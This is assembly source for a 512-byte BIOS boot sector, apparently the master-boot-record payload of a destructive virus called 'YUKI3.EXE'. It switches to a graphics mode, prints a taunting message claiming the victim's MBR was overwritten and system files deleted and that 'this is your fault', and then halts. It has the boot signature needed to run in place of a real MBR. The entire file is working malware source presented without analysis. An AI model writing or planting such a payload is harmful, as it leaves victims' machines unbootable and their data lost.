[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "[ PC DESTROYED BY YUKI3.EXE VIRUS ]", 13, 10, "Your computer has been destroyed not only because I overrided the master boot record but because I deleted all of your required system files.", 13, 10, "so yeah I'm just saying your computer is pretty trashed now.", 13, 10, "...", 13, 10, "You're going to have to fully reinstall Windows :D", 13, 10, ".", 13, 10, "And remember this is your fault :)",13, 10, "", 13, 10, "", 13, 10, "CRITICAL SYSTEM COMPONENTS DAMAGED"

times 510 - ($-$$) db 0
dw      0AA55h